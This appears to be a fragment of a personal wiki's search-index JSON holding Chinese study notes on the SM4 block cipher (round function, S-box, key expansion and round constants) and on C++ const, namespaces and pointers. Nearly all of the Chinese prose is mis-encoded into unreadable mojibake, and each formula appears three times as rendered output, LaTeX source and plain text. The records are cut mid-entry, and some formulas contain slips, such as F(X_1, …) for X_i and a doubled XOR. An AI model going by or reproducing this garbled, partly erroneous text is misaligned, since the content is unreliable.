å›ºå®šå‚æ•°(128bit)ï¼šCK=(CK0,CK1,â‹¯â€‰,CK31)CK=(CK_0,CK_1,\\cdots,CK_{31})CK=(CK0â€‹,CK1â€‹,â‹¯,CK31â€‹) SM4ç®—æ³•åŠ å¯†æµç¨‹å›¾ï¼š SM4ç®—æ³•ç¤ºæ„å›¾ï¼ˆå°†è½®å‡½æ•°ä¹Ÿæ”¾è¿›å»ï¼‰ï¼š è¯¦ç»†è¿‡ç¨‹ SM4ç¬”è®°è„‰ç»œ{è½®å‡½æ•°F{åˆæˆç½®æ¢T{éçº¿æ€§å˜æ¢Ï„â€”Sç›’çº¿æ€§å˜æ¢Lå¯†é’¥æ‹“å±•ç®—æ³•ååºå˜æ¢SM4ç¬”è®°è„‰ç»œ\\begin{cases} è½®å‡½æ•°F\\begin{cases} åˆæˆç½®æ¢T\\begin{cases} éçº¿æ€§å˜æ¢\\tauâ€”Sç›’\\\\ çº¿æ€§å˜æ¢L \\end{cases} \\end{cases}\\\\ å¯†é’¥æ‹“å±•ç®—æ³•\\\\ ååºå˜æ¢ \\end{cases} SM4ç¬”è®°è„‰ç»œâ©âªâªâªâªâ¨âªâªâªâªâ§â€‹è½®å‡½æ•°F{åˆæˆç½®æ¢T{éçº¿æ€§å˜æ¢Ï„â€”Sç›’çº¿æ€§å˜æ¢Lâ€‹â€‹å¯†é’¥æ‹“å±•ç®—æ³•ååºå˜æ¢â€‹ 1. è½®å‡½æ•°Fï¼ˆ32è½®ï¼‰ æ•´ä½“åŠ å¯†å‡½æ•°ï¼š \\begin{equation}\\begin{split} X_{i+4}&amp;=F(X_1,X_{i+1},X_{i+2},X_{i+3},rk_i)\\\\ &amp;=X_iâŠ•T(X_{i+1},X_{i+2},X_{i+3}âŠ•rk_i)\\\\ &amp;i=0,1,\\cdots,31\\\\ &amp;è¿™ä¸ªæ˜¯æ¯ä¸€è½®å‡½æ•°å‰æœ€å³è¾¹çš„é‚£ä¸ªX\\\\ &amp;å‰é¢ä¸‰ä¸ªXæ˜¯ç”±ä¸Šä¸€è½®çš„åä¸‰ä¸ªå·¦ç§»å¾—åˆ° \\end{split}\\end{equation} â€‹\tSM4çš„è½®å‡½æ•°Få°†è¾“å…¥éƒ¨åˆ†çœ‹åšäº†4ä¸ª32bité•¿åº¦çš„æ•°æ®ï¼Œæ¯è½®çš„å3ä¸ªéƒ¨åˆ†éƒ½å‘å·¦ç§»åŠ¨32bitçš„æ•°æ®é•¿åº¦ï¼Œä½œä¸ºè¿›è¡Œä¸‹ä¸€è½®å‡½æ•°çš„å‰ä¸‰ä¸ªè¾“å…¥ã€‚ â€‹\tè¿™ä¸‰ç»„æ•°æ®å¼‚æˆ–åè¿›å…¥éçº¿æ€§éƒ¨åˆ†Ï„å’Œçº¿æ€§éƒ¨åˆ†Lï¼Œè¿ç®—åçš„ç»“æœä¸ç¬¬ä¸€ç»„æ•°æ®å¼‚æˆ–å¹¶ç½®äºæœ€å³é¢ã€‚ â€‹\tå¦‚æ­¤å¾ªç¯å¾€å¤32è½®ï¼Œä¹Ÿå°±æ˜¯æ•°æ®ä¸€å…±å·¦ç§»äº†8ä¸ªå‘¨æœŸï¼Œå°†å…¶ä¸­çš„æ··ä¹±å› ç´ ä¸æ–­æ‰©æ•£è‡³æ¯ä¸ªbitä½ä¸­ã€‚ â€‹\tæœ€åå°†4æ®µæ•°æ®ååºç½®æ”¾ï¼Œå¦‚æ­¤æ‰èƒ½åœ¨è§£å¯†æ—¶é‡å¤åˆ©ç”¨ç°æœ‰çš„ç»“æ„ã€‚ ï¼ˆ1ï¼‰åˆæˆç½®æ¢T â€‹\tTï¼šZ232â†’Z232Tï¼šZ^{32}_{2}\\rightarrow Z^{32}_{2}Tï¼šZ232â€‹â†’Z232â€‹ï¼Œæ˜¯ä¸€ä¸ªå¯é€†å˜æ¢ï¼Œç”±éçº¿æ€§å˜æ¢Ï„\\tauÏ„å’Œçº¿æ€§å˜æ¢Lå¤åˆè€Œæˆ T(â‹…)=L(Ï„(â‹…)) T(\\cdot)=L(\\tau(\\cdot)) T(â‹…)=L(Ï„(â‹…)) â‘ éçº¿æ€§å˜æ¢Ï„\\tauÏ„ â€‹\tè¿™ä¸ªéƒ¨åˆ†ç”±4ä¸ªå¹³è¡Œçš„8bitè¿›8bitè¾“å‡ºçš„Sç›’ç»„æˆã€‚ â€‹\tè¿™é‡Œä½¿ç”¨çš„Sç›’æ˜¯ä¸€ç§256ä¸ªæ•°åˆ°256ä¸ªæ•°çš„æ˜ å°„ï¼Œå› ä¸ºå…¶å…·æœ‰è¾ƒå¥½çš„éçº¿æ€§ç¨‹åº¦ç­‰è‰¯å¥½çš„å¯†ç å­¦æ€§è´¨ï¼Œæ¯”è¾ƒé€‚åˆç”¨ä½œæ•°æ®æ··ä¹±çš„æ ¸å¿ƒå·¥å…·ã€‚ â€‹\tç”¨å…¬å¼è¡¨è¾¾Ï„\\tauÏ„å‡½æ•°ä¸ºï¼š (b0,b1,b2,b3)=Ï„(A)=(Sbox(a0),Sbox(a1)ï¼ŒSbox(a2)ï¼ŒSbox(a3)Â ) (b_0,b_1,b_2,b_3)=\\tau(A)=(Sbox(a_0),Sbox(a_1)ï¼ŒSbox(a_2)ï¼ŒSbox(a_3)\\ ) (b0â€‹,b1â€‹,b2â€‹,b3â€‹)=Ï„(A)=(Sbox(a0â€‹),Sbox(a1â€‹)ï¼ŒSbox(a2â€‹)ï¼ŒSbox(a3â€‹)Â ) å…¶ä¸­ï¼Œè¾“å…¥ä¸ºA=(a0,a1,a2,a3)A=(a_0,a_1,a_2,a_3)A=(a0â€‹,a1â€‹,a2â€‹,a3â€‹) è¾“å‡ºä¸ºB=(b0,b1,b2,b3)B=(b_0,b_1,b_2,b_3)B=(b0â€‹,b1â€‹,b2â€‹,b3â€‹) â€‹ â€‹\tSç›’å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼ŒSç›’ä¸­çš„æ•°æ®å‡é‡‡ç”¨åå…­è¿›åˆ¶æ•°è¡¨ç¤ºã€‚ â€‹\tè®¾Sç›’çš„è¾“å…¥ä¸ºEFï¼Œåˆ™ç»Sç›’è¿ç®—çš„è¾“å‡ºç»“æœä¸ºè¡¨ä¸­ç¬¬Eè¡Œã€ç¬¬Fåˆ—çš„å€¼ï¼Œå³Sbox(EF)=0x84 â€‹\tç»è¿‡4ä¸ªSç›’è¿›è¡Œéçº¿æ€§æ˜ å°„åçš„æ•°æ®ï¼Œä¸åŸæ•°æ®æ²¡æœ‰ç›´è§‚çš„æ•°å­¦å…³ç³»ï¼Œæ˜¯æŠµæŠ—çº¿æ€§åˆ†æéå¸¸æœ‰æ•ˆçš„å·¥å…·ã€‚ â‘¡çº¿æ€§å˜æ¢L éçº¿æ€§å˜æ¢$\\tau$çš„è¾“å‡ºä½œä¸ºçº¿æ€§å˜æ¢Lçš„è¾“å…¥ \\begin{equation}\\begin{split} C&amp;=L(B)\\\\ &amp;=BâŠ•(B&lt;&lt;&lt;2)âŠ•âŠ•(B&lt;&lt;&lt;10)âŠ•(B&lt;&lt;&lt;18)âŠ•(B&lt;&lt;&lt;24) \\end{split}\\end{equation} â€‹\tç›´è§‚è§£é‡Šä¸ºå°†Bï¼ˆÏ„å‡½æ•°çš„è¾“å‡ºå€¼ï¼Œ32bitï¼‰åˆ†åˆ«å·¦ç§»2,10,18,24æ¯”ç‰¹åï¼Œä¸å…¶è‡ªèº«ä¸€åŒå¼‚æˆ–ï¼Œå³å¯å°†æ¯”ç‰¹ä½å½±å“åˆ°å…¶å®ƒä½ç½®ã€‚ â€‹\tã€&lt;&lt;&lt;è¡¨ç¤ºå‘å·¦å¾ªç¯ç§»ä½ã€‘åƒç§»ä½ã€å¼‚æˆ–ç­‰è¿™äº›æ“ä½œéƒ½å±äºçº¿æ€§è¿ç®—ï¼Œç¡¬ä»¶å®ç°æ–¹ä¾¿ï¼Œè½¯ä»¶å®ç°åŒæ ·é«˜æ•ˆï¼Œä½œä¸ºå¯†ç ç®—æ³•ä¸­è¾…åŠ©æ··ä¹±æ‰©æ•£çš„é‡è¦éƒ¨åˆ†ï¼Œåœ¨ç®—æ³•ä¸­å¤§é‡æ™®éå­˜åœ¨ã€‚ 2. å¯†é’¥æ‹“å±•ç®—æ³• â€‹\tè¿™çœ‹ä¸Šå»æ˜¯ä¸æ˜¯å’Œè½®å¯†é’¥çš„ç»“æ„æ˜¯ä¸€æ ·ï¼Ÿ â€‹\tè¿™æ ·åœ¨ç¡¬ä»¶å®ç°ä¸Šé¿å…äº†å•ç‹¬åˆ¶ä½œä¸€ä¸ªè½®å¯†é’¥æ‰©å±•ç”µè·¯ï¼Œé™ä½äº†ç”µè·¯é—¨æ•°ï¼Œæ˜¯ä¸€ç§ä¸é”™çš„è§£å†³æ–¹æ³•ã€‚ â€‹\tè¿™ç§ç»“æ„ç”Ÿæˆçš„è½®å¯†é’¥æ˜¯éçº¿æ€§åº¦è¾ƒé«˜çš„ï¼Œç³»ç»Ÿå‚æ•°è¿˜èƒ½ç¡®ä¿SM4ç®—æ³•åœ¨ä¸åŒçš„åº”ç”¨ç¯å¢ƒä¸­éš”ç¦»ä½¿ç”¨ï¼Œä¸åŒçš„ç³»ç»Ÿä¸­ä½¿ç”¨ä¸åŒçš„ç³»ç»Ÿå‚æ•°ï¼Œå³ä½¿ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ä¹Ÿæ— æ³•åŠ å¯†åŠ å¯†ï¼Œæ— æ³•æ­£å¸¸é€šä¿¡ã€‚ è½®å¯†é’¥ç”Ÿæˆæ–¹æ³•ï¼š (K_0,K_1,K_2,K_3)=(MK_0âŠ•FK_0,MK_1âŠ•FK_1,MK_2âŠ•FK_2,MK_3âŠ•FK_3)\\\\[2ex] \\begin{equation}\\begin{split} rk_{i}&amp;=K_{i+4}\\\\ &amp;=K_iâŠ•T&#039;(K_{i+1},K_{i+2},K_{i+3},CK_i)\\\\ \\end{split}\\end{equation} å…¶ä¸­ï¼ŒTâ€²(â‹…)=Lâ€²(Ï„(â‹…))T&#x27;(\\cdot)=L&#x27;(\\tau(\\cdot))Tâ€²(â‹…)=Lâ€²(Ï„(â‹…))ï¼ŒÏ„\\tauÏ„å˜æ¢ä¸åŠ å¯†è½®å‡½æ•°ä¸­çš„ç›¸åŒï¼Œåªæ˜¯çº¿æ€§å˜æ¢Lå˜ä¸ºLâ€™ Lâ€²(B)=BâŠ•(B&lt;&lt;&lt;13)âŠ•(B&lt;&lt;&lt;23)L&#x27;(B)=BâŠ•(B&lt;&lt;&lt;13)âŠ•(B&lt;&lt;&lt;23) Lâ€²(B)=BâŠ•(B&lt;&lt;&lt;13)âŠ•(B&lt;&lt;&lt;23) ç³»ç»Ÿå‚æ•°FKå–å€¼å›ºå®šï¼Œç”¨åå…­è¿›åˆ¶æ•°è¡¨ç¤ºï¼š FK=(FK0,FK1,FK2,FK3)FK=(FK_0,FK_1,FK_2,FK_3)FK=(FK0â€‹,FK1â€‹,FK2â€‹,FK3â€‹) FK0=(A3B1BAC6)FK_0=(A3B1BAC6)FK0â€‹=(A3B1BAC6) FK1=(56AA3350)FK_1=(56AA3350)FK1â€‹=(56AA3350) FK2=(677D9197)FK_2=(677D9197)FK2â€‹=(677D9197) FK3=(B27022DC)FK_3=(B27022DC)FK3â€‹=(B27022DC) (æ²¡è®²)å›ºå®šå‚æ•°CKè¿™æ ·æ¥å–ï¼šè®¾ckijä¸ºCKiçš„ç¬¬jä¸ªå­—èŠ‚(i=0,1,â‹¯â€‰,31;j=0,1,2,3)ck_{ij}ä¸ºCK_içš„ç¬¬jä¸ªå­—èŠ‚(i=0,1,\\cdots,31;j=0,1,2,3)ckijâ€‹ä¸ºCKiâ€‹çš„ç¬¬jä¸ªå­—èŠ‚(i=0,1,â‹¯,31;j=0,1,2,3)ï¼Œå³CKi=(cki,0,cki,1,cki,2,cki,3)CK_i=(ck_{i,0},ck_{i,1},ck_{i,2},ck_{i,3})CKiâ€‹=(cki,0â€‹,cki,1â€‹,cki,2â€‹,cki,3â€‹)ï¼Œåˆ™ckij=(4i+j)Ã—7ï¼ˆmod256)ck_{ij}=(4i+j)\\times7ï¼ˆmod256)ckijâ€‹=(4i+j)Ã—7ï¼ˆmod256) â€‹\t32ä¸ªå›ºå®šå‚æ•°CKçš„åå…­è¿›åˆ¶è¡¨ç¤ºå½¢å¼å…·ä½“å€¼ï¼š00070E15ï¼Œ1C232A31ï¼Œ383F464Dï¼Œ545B6269ï¼Œ70777E85ï¼Œ8C939AA1ï¼ŒA8AFB6BDï¼ŒC4CBD2D9ï¼ŒE0E7EEF5ï¼ŒFC030A11ï¼Œ181F262Dï¼Œ343B4249ï¼Œ50575E65ï¼Œ6C737A81ï¼Œ888F969Dï¼ŒA4Abb2b9ï¼ŒC0C7CEd5ï¼ŒDCE3EAF1ï¼ŒF8FF060dï¼Œ141B2229ï¼Œ30373E45ï¼Œ4C535A61ï¼Œ686F767Dï¼Œ848B9299ï¼ŒA0A7AEB5ï¼ŒBCC3CAD1ï¼ŒD8DFE6EDï¼ŒF4FB0209ï¼Œ10171E25ï¼Œ2C333A41ï¼Œ484F565Dï¼Œ646B7279ã€‚ 3. ååºå˜æ¢ æ˜¯ä¸æ˜¯å¿˜äº†å†™ï¼Ÿ"},{"title":"Function arguments & return values","path":"/wiki/Thinking_in_C++/Function_arguments&return_values.html","content":"The use of const to specify function arguments and return values is another place where the concept of constants can be confusing. If you are passing objects by value, specifying const has no meaning to the client (it means that the passed argument cannot be modified inside the function). If you are returning an object of a user-defined type by value as a const, it means the returned value cannot be modified. If you are passing and returning addresses, const is a promise that the destination of the address will not be changed. Passing by const value å‡½æ•°å‚æ•°æœ¬èº«å°±æ˜¯å€¼ä¼ é€’ï¼Œå‡½æ•°å†…éƒ¨å¯¹è¯¥å‚æ•°çš„ä¿®æ”¹ä¸ä¼šæ”¹å˜ä¼ å…¥çš„è¿™ä¸ªå‚æ•°ï¼Œå†åŠ constæ˜¯æ²¡æ„ä¹‰çš„ï¼Œåè€Œè¿™ä¸ªconstä¼šè®©calleræ„Ÿåˆ°ç–‘æƒ‘ã€‚ 1234void f1(const int i)&#123; i++; // Illegal -- compile-time error&#125; è¿™ä¸ªconstå®é™…ä¸Šå¯¹å‡½æ•°çš„creatoræ˜¯ä¸€ä¸ªå·¥å…·ï¼ˆè¡¨æ˜åœ¨å‡½æ•°å†…éƒ¨ä¸ä¼šå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œä¿®æ”¹ï¼‰ï¼Œå¯¹callerè€Œè¨€æ˜¯æ²¡ç”¨çš„ã€‚æ‰€ä»¥å»ºè®®å†™æˆå¦‚ä¸‹å½¢å¼ï¼šå°†constå†™åˆ°å‡½æ•°å†…éƒ¨ï¼Œè€Œä¸æ˜¯å†™åœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸Š 12345void f2(int ic)&#123; const int &amp;i = ic; i++; // Illegal -- compile-time error&#125; å¥½å¤„ï¼š ä¿æŒäº†constçš„å«ä¹‰ï¼Œå‡½æ•°é‡Œä¸ä¼šå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¿®æ”¹ å¯¹callerè€Œè¨€åšäº†hidden Returning by const value å¸¸é‡ conståŸæ„æ˜¯è¯´è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼ä¸èƒ½è¢«ä¿®æ”¹ï¼Œä½†å¯¹äºè¿”å›å¸¸é‡è€Œè¨€ï¼Œæ²¡åŒºåˆ«çš„ï¼Œå®ƒæœ¬æ¥å°±æ˜¯å¸¸é‡ï¼Œè€Œä¸æ˜¯å˜é‡ï¼Œæœ¬æ¥å°±ä¸èƒ½è¢«ä¿®æ”¹ã€‚åè€ŒåŠ constä¼šè®©è¿™ä¸ªå‡½æ•°çš„callerè¿·æƒ‘ï¼Œå»ºè®®å»æ‰const 123456789101112//: C08:Constval.cpp// Returning consts by value// has no meaning for built-in typesint f3() &#123; return 1; &#125;const int f4() &#123; return 1; &#125;int main()&#123; const int j = f3(); // Works fine int k = f4(); // But this works fine too!&#125; ///:~ å˜é‡/å¯¹è±¡ å¦‚æœå‡½æ•°è¿”å›ä¸€ä¸ªå˜é‡/å¯¹è±¡ï¼ŒåŠ constè¡¨ç¤ºè¯´è¿™ä¸ªè¿”å›å€¼ä¸èƒ½è¢«ä¿®æ”¹ï¼Œæ¨å¯¼å‡º=&gt;è¿™ä¸ªè¿”å›å€¼ä¸èƒ½åšlvalue(å·¦å€¼)ï¼Œthat is, it cannot be assigned to or otherwise modifiedã€‚ markï¼š ä¸´æ—¶å¯¹è±¡æ€»æ˜¯constçš„ theyâ€™re automatically const å› ä¸ºä½ æ²¡æ³•æ“çºµå®ƒä»¬ï¼ˆå˜é‡åæˆ–å…¶ä»–æ–¹å¼ï¼‰ï¼Œæ‰€ä»¥ç¼–è¯‘å™¨å°±è®¾å®šä¸ºconst Passing and returning addresses è¿”å›å€¼æ˜¯ä¸€ä¸ªæŒ‡é’ˆæˆ–å¼•ç”¨ï¼Œå‡½æ•°è°ƒç”¨è€…å°±å¯èƒ½ä¼šä¿®æ”¹è¿™ä¸ªè¿”å›å€¼ã€‚æ­¤æ—¶åŠ constï¼Œå°±èƒ½é˜²æ­¢è¿™æ ·çš„äº‹æƒ…å‘ç”Ÿã€‚"},{"title":"ZUC","path":"/wiki/cryptography/ZUC.html","content":"è§pdf"},{"title":"Namespaces","path":"/wiki/Thinking_in_C++/Namespaces.html","content":"åœ¨Cè¯­è¨€ä¸­ï¼Œå‡½æ•°åã€å˜é‡åç­‰æ ‡è¯†ç¬¦åå­—ä¸èƒ½ç›¸åŒï¼Œå¦åˆ™ä¼šå¯¼è‡´å‘½åå†²çªã€‚C++å¼•å…¥äº†å‘½åç©ºé—´ï¼ˆNamespaceï¼‰çš„æ¦‚å¿µï¼Œä»¥é¿å…è¿™ç§å†²çªï¼Œå®ƒçš„è§£å†³æ–¹æ³•å°±æ˜¯å°†è¿™äº›æ ‡è¯†ç¬¦åˆ†åˆ°ä¸åŒçš„â€œå°ç©ºé—´â€ä¸­ã€‚ ä¸ºä»€ä¹ˆéœ€è¦å‘½åç©ºé—´ï¼Ÿ åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¯èƒ½æœ‰æˆç™¾ä¸Šåƒä¸ªå‡½æ•°å’Œå˜é‡ã€‚å¦‚æœæ‰€æœ‰è¿™äº›éƒ½æ”¾åœ¨ä¸€ä¸ªå…¨å±€èŒƒå›´å†…ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šå‡ºç°æ ‡è¯†ç¬¦ä¹‹é—´å†²çªçš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œ å°Aå’Œå°Bå¯èƒ½åœ¨å„è‡ªå¼€å‘æ—¶éƒ½å†™äº†ä¸¤ä¸ªåä¸ºhelperçš„å‡½æ•° åŒä¸€å¼€å‘è€…åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­å†™äº†ä¸¤ä¸ªåä¸ºhelperçš„å‡½æ•° åœ¨æ²¡æœ‰å‘½åç©ºé—´çš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨æ— æ³•åŒºåˆ†è¿™ä¸¤ä¸ªåŒåçš„å‡½æ•°ã€‚ å®šä¹‰å‘½åç©ºé—´ ä½¿ç”¨å…³é”®å­—namespaceåè·Ÿå‘½åç©ºé—´çš„åç§°å’Œä¸€å¯¹èŠ±æ‹¬å·æ¥å®šä¹‰ä¸€ä¸ªå‘½åç©ºé—´ï¼Œå³èŠ±æ‹¬å·çš„ç»“å°¾ä¸ç”¨è·Ÿåˆ†å·ã€‚ 123456789101112namespace MyNamespace &#123; // å˜é‡ int value; // å‡½æ•° void myFunction() &#123; //... &#125; // ç±» class&#123;&#125;;&#125; å‘½åç©ºé—´åˆ«å å¯ä»¥ä¸ºå‘½åç©ºé—´è®¾ç½®ä¸€ä¸ªåˆ«åï¼Œä»¥ä¾¿äºç®€åŒ–è¾ƒé•¿çš„å‘½åç©ºé—´åç§°ã€‚ 12345678910namespace MyNamespace &#123; void myFunction() &#123; // ... &#125;&#125;namespace MNS = MyNamespace; // è®¾ç½®åˆ«åä¸ºMNS// ä½¿ç”¨åˆ«åMNS::myFunction(); åµŒå¥—çš„å‘½åç©ºé—´ ä¸€ä¸ªå‘½åç©ºé—´å¯ä»¥å®šä¹‰åœ¨å¦ä¸€ä¸ªå‘½åç©ºé—´å†… 1234567namespace Outer &#123; namespace Inner &#123; void innerFunction() &#123; //... &#125; &#125;&#125; è°ƒç”¨åµŒå¥—å‘½åç©ºé—´ä¸­çš„å‡½æ•° 1Outer::Inner::innerFunction(); ä¸è¿ç»­çš„å‘½åç©ºé—´ å¯ä»¥åœ¨é¡¹ç›®çš„ä¸åŒéƒ¨åˆ†æ‰©å±•åŒä¸€ä¸ªå‘½åç©ºé—´ï¼Œæ‰€æœ‰è¿™äº›åˆ†æ•£çš„éƒ¨åˆ†åœ¨ç¨‹åºä¸­è¢«è§†ä¸ºä¸€ä¸ªç»Ÿä¸€çš„å‘½åç©ºé—´ã€‚ åŒä¸€ä¸ªå‘½åç©ºé—´çš„å®šä¹‰å¯ä»¥åˆ†æ•£åœ¨ä¸åŒçš„å¤´æ–‡ä»¶ä¸­ï¼Œå¦‚header2.hä¸­åœ¨ä¸ºå‘½åç©ºé—´MyNamespaceå¢åŠ æ–°çš„å†…å®¹ï¼šmyFunction2() å‡½æ•°ã€‚ header1.h1234567namespace MyNamespace &#123; void myFunction() &#123; //... &#125;&#125; header2.h1234567namespace MyNamespace &#123; void myFunction2() &#123; //... &#125;&#125; åŒ¿åå‘½åç©ºé—´ åŒ¿åå‘½åç©ºé—´æ˜¯æ²¡æœ‰åç§°çš„å‘½åç©ºé—´ï¼Œä¸»è¦ç”¨äºé™åˆ¶å…¶æˆå‘˜çš„å¯è§æ€§åªåœ¨å½“å‰æ–‡ä»¶å†…ã€‚é€šå¸¸ç”¨äºåªåœ¨å•ä¸ªæ–‡ä»¶ä¸­éœ€è¦çš„å®ç°ç»†èŠ‚ï¼Œä»è€Œé¿å…å…¨å±€å‘½åç©ºé—´çš„æ±¡æŸ“ã€‚ 12345namespace &#123; void privateFunction() &#123; // ... &#125;&#125; ä½¿ç”¨å‘½åç©ºé—´ ä½œç”¨åŸŸè¿ç®—ç¬¦ ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦::æ¥æŒ‡å®šç‰¹å®šå‘½åç©ºé—´ä¸­çš„å…ƒç´  å‘½åç©ºé—´å®šä¹‰12345namespace MyNamespace &#123; void myFunction() &#123; //... &#125;&#125; å‘½åç©ºé—´ä½¿ç”¨1MyNamespace::myFunction(); å‰é¢æ²¡æœ‰è·Ÿå‘½åç©ºé—´åå­—è¡¨ç¤ºç”¨çš„æ˜¯å…¨å±€çš„å‘½åç©ºé—´ 12345678910111213141516#include &lt;stdio.h&gt;namespace x &#123; void Print() &#123; printf(&quot;x::Print() called &quot;); &#125;&#125;void Print() &#123; printf(&quot;Print() called &quot;);&#125;int main() &#123; x::Print(); // è°ƒç”¨å‘½åç©ºé—´xä¸­çš„Printå‡½æ•° ::Print(); // è°ƒç”¨å…¨å±€ä½œç”¨åŸŸä¸­çš„Printå‡½æ•°&#125; ä½¿ç”¨usingæŒ‡ä»¤ å¯ä»¥ä½¿ç”¨usingå£°æ˜æ¥é¿å…æ¯æ¬¡éƒ½éœ€è¦é”®å…¥å‘½åç©ºé—´å ä½¿ç”¨using namespaceå£°æ˜æ•´ä¸ªå‘½åç©ºé—´ï¼š 12using namespace MyNamespace;myFunction(); // ç›´æ¥è°ƒç”¨ï¼Œä¸éœ€è¦å‰ç¼€ ä½¿ç”¨ using å£°æ˜å•ä¸ªå…ƒç´  12using MyNamespace::myFunction;myFunction(); // ç›´æ¥è°ƒç”¨ï¼Œä¸éœ€è¦å‰ç¼€ æ ‡å‡†å‘½åç©ºé—´ C++æ ‡å‡†åº“çš„æ‰€æœ‰æ ‡è¯†ç¬¦éƒ½å®šä¹‰åœ¨ä¸€ä¸ªåä¸º std çš„å‘½åç©ºé—´ä¸­ã€‚ä¾‹å¦‚ï¼Œæ ‡å‡†åº“ä¸­çš„è¾“å…¥è¾“å‡ºæµç±»å’Œå‡½æ•°éƒ½ä½äº std å‘½åç©ºé—´ä¸­ã€‚ 12std::cout &lt;&lt; &quot;Hello, World!&quot;;std::vector&lt;int&gt; v;"},{"title":"Pointers","path":"/wiki/Thinking_in_C++/Pointers.html","content":"Pointers and const When using const with pointers, you have two options: const can be applied to what the pointer is pointing to, or the const can be applied to the address stored in the pointer itself. Pointer to const const specifieråœ¨*çš„å·¦è¾¹ï¼Œå«æŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼Œè¡¨ç¤ºä¸èƒ½é€šè¿‡è¿™ä¸ªæŒ‡é’ˆä¿®æ”¹æŒ‡å‘çš„æ•°æ®ã€‚ å…¶å®æœ‰ä¸¤ä¸ªå«ä¹‰ï¼š æŒ‡å‘çš„æ•°æ®æ˜¯å¸¸é‡ï¼Œä½ ä¸èƒ½ç”¨è¿™ä¸ªæŒ‡é’ˆæ¥ä¿®æ”¹å®ƒï¼ˆå¸¸é‡æœ¬èº«å°±ä¸èƒ½è¢«ä¿®æ”¹ï¼‰ ä½ ä¸æƒ³é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ¥ä¿®æ”¹æŒ‡å‘çš„æ•°æ® ç”¨2æ¥è®°æ¯”è¾ƒå¥½ï¼Œ2å¯ä»¥æ¨å¯¼å‡º1ã€‚ä¸èƒ½é€šè¿‡è¿™ä¸ªæŒ‡é’ˆä¿®æ”¹æŒ‡å‘çš„å€¼oræŒ‡å‘çš„å€¼æœ¬èº«å°±æ˜¯å¸¸é‡ï¼Œä¸èƒ½è¢«ä¿®æ”¹ 12 const int* u;//u is a pointer, which points to a const int no initialization is required å¦ä¸€ç§å†™æ³•123 int const* v;\t//v is an ordinary pointer to an int that happens to be const. //That is, the const has bound itself to the int again, and the effect is the same as the previous definition. ä¾‹ ä¸èƒ½é€šè¿‡è¿™ä¸ªæŒ‡é’ˆæ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼ å¯ä»¥æ”¹å˜è¿™ä¸ªæŒ‡é’ˆå®ƒæŒ‡å‘çš„åœ°å€ 1234567const int originalValue = 10;const int newValue = 20;const int* ptr = &amp;originalValue; // ptr æŒ‡å‘ originalValueptr = &amp;newValue; // ptr ç°åœ¨æŒ‡å‘ newValue// *ptr = 30; // é”™è¯¯ï¼šä¸èƒ½é€šè¿‡ ptr ä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼ const pointer const specifieråœ¨*çš„å³è¾¹ï¼Œè¿™ä¸ªæŒ‡é’ˆæ˜¯å¸¸é‡æŒ‡é’ˆï¼ˆConst Pointerï¼‰ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„åœ°å€ä¸èƒ½æ”¹å˜ï¼Œä¸èƒ½å†æŒ‡å‘åˆ«çš„å†…å­˜ã€‚ 123int d = 1;int* const w = &amp;d;//w is a pointer, which is const, that points to an int éœ€è¦an initial valueï¼Œå› ä¸ºæ˜¯å¸¸é‡æŒ‡é’ˆï¼Œä¹‹åè¿™ä¸ªæŒ‡é’ˆæ²¡æ³•æ”¹å˜å®ƒçš„æŒ‡å‘ ä¾‹ è¿™ä¸ªæŒ‡é’ˆä¸èƒ½æ”¹å˜å®ƒæŒ‡å‘çš„åœ°å€ å¯ä»¥é€šè¿‡å®ƒä¿®æ”¹å®ƒæŒ‡å‘çš„å€¼ï¼ˆå¦‚æœå®ƒæŒ‡å‘çš„å€¼ä¸æ˜¯constçš„è¯ï¼‰ 1234567int value1 = 10;int value2 = 20;int* const ptr = &amp;value1; // ptr æ˜¯ä¸€ä¸ªæŒ‡å‘ value1 çš„å¸¸é‡æŒ‡é’ˆ// ptr = &amp;value2; // é”™è¯¯ï¼šä¸èƒ½æ”¹å˜ ptr æŒ‡å‘çš„åœ°å€*ptr = 30; // æ­£ç¡®ï¼šé€šè¿‡ ptr ä¿®æ”¹ value1 çš„å€¼ const pointer to a const object Now neither the pointer nor the object can be changed. 123int d = 1;const int* const x = &amp;d; // (1)int const* const x2 = &amp;d; // (2) ä¸åŒçš„å«æ³• å¸¸é‡æŒ‡é’ˆ (Constant Pointer) /æŒ‡é’ˆå¸¸é‡ (Pointer Constant)ï¼Œä¸æ˜¯æ ‡å‡†çš„C++æœ¯è¯­ã€‚ å¸¸é‡æŒ‡é’ˆ (Constant Pointer) ï¼Œå’ŒPointer to constä¸€å›äº‹ æŒ‡é’ˆå¸¸é‡ (Pointer Constant)ï¼Œå’ŒConst Pointerä¸€å›äº‹ Top-level constï¼ˆé¡¶å±‚constï¼‰ï¼šæŒ‡é’ˆè‡ªèº«æ˜¯å¸¸é‡ã€‚å’Œå¸¸é‡æŒ‡é’ˆï¼ˆConst Pointerï¼‰æ˜¯ä¸€å›äº‹ã€‚ Low-level constï¼ˆåº•å±‚constï¼‰ï¼šä¸èƒ½é€šè¿‡æŒ‡é’ˆæ¥ä¿®æ”¹å®ƒæŒ‡å‘çš„æ•°æ®ã€‚å’ŒæŒ‡å‘å¸¸é‡çš„æŒ‡é’ˆï¼ˆPointer to constï¼‰æ˜¯ä¸€å›äº‹ã€‚ 2.4.3.Top-Level const As weâ€™ve seen, a pointer is an object that can point to a different object. As a result, we can talk independently about whether a pointer is const and whether the objects to which it can point are const. We use the term top-level const to indicate that the pointer itself is a const. When a pointer can point to a const object, we refer to that const as a low-level const.ã€ŠC++ Primer 5thã€‹ Character array literals 